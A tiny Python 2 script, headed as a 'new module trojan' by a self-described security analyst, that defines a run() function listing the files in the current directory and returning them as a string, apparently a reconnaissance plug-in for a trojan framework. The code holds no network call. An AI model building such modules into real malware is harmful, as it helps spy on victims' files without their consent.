##
# script for new module trojan in Python
#@author Jerome Themee - security analyst
#@ 15/07/2015
##
import os

def run(**args):
	
	print "[*] Dir listener module]."
	files = os.listdir(".")

	return str(files)